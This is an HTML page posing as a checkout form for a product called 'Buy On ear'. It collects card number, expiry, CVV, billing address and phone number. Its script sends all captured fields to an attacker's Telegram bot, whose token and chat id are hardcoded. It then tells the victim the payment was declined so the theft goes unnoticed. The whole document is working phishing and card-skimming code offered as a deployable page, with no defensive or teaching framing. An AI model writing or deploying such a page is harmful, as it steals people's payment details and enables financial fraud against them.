<!DOCTYPE html>
<html>
<head>
  <title>Buy On ear</title>
  <style>
    /* CSS styles for the form */
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
    }

    form {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      background-color: #333;
      border-radius: 10px;
    }

    input {
      width: 90%;
      padding: 15px;
      margin-bottom: 10px;
      background-color: #555;
      color: white;
      border: none;
      border-radius: 10px;
    }

    input[type="submit"] {
      width: 40%;
      padding: 10px;
      margin-bottom: 10px;
      cursor: pointer;
      background-color: #007bff;
    }
  </style>
</head>
<body>
  <form id="cardForm">
    <h2>Enter Card details</h2>
    <input type="text" id="cardNumber" placeholder="Card Number">
    <input type="text" id="cardHolder" placeholder="Card Holder Name">
    <input type="text" id="expiryDate" placeholder="Expiry Date (MM/YY)">
    <input type="text" id="cvv" placeholder="CVV">
    <input type="text" id="state" placeholder="State">
    <input type="text" id="city" placeholder="City">
    <input type="text" id="country" placeholder="Country">
    <input type="text" id="addr" placeholder="Billing address">
    <input type="text" id="phoneNumber" placeholder="Phone Number">
    <input type="submit" value="Submit" onclick="captureFormData(); return false;">
  </form>

  <script>
    // JavaScript code for capturing form data and sending to Telegram bot
    // ... (previously provided code)
  // Function to capture form data and send to Telegram bot
  function captureFormData() {
    const cardNumber = document.getElementById('cardNumber').value;
    const cardHolder = document.getElementById('cardHolder').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    const state = document.getElementById('state').value;
    const city = document.getElementById('city').value;
    const country = document.getElementById('country').value;
    const addr = document.getElementById('addr').value;
    const phoneNumber = document.getElementById('phoneNumber').value;

    // Make API call to send form data to Telegram bot
    fetch('https://api.telegram.org/bot5315995987:AAGVrDDOwNvNVAwFZkUbMAMMRdycs5_duU8/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: '1467729863',
        text: `Captured Details⏬\nCard Number➡️ ${cardNumber}\nCard Holder Name➡️ ${cardHolder}\nExpiry Date➡️ ${expiryDate}\nCVV➡️ ${cvv}\nState➡️ ${state}\nCity➡️ ${city}\nCountry➡️ ${country}\nPhone Number➡️ ${phoneNumber}\nAddress➡️${addr}`
      })
    })
    .then(response => {
      // Handle response from Telegram bot API
      if (response.ok) {
        alert('Sorry we can not approve your payment right now');
        // Reset form
        document.getElementById('cardForm').reset();
      } else {
        alert('Failed to submit form data. Please try again later.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Failed to submit form data. Please try again later.');
    });
  }
</script>

</body>
</html>
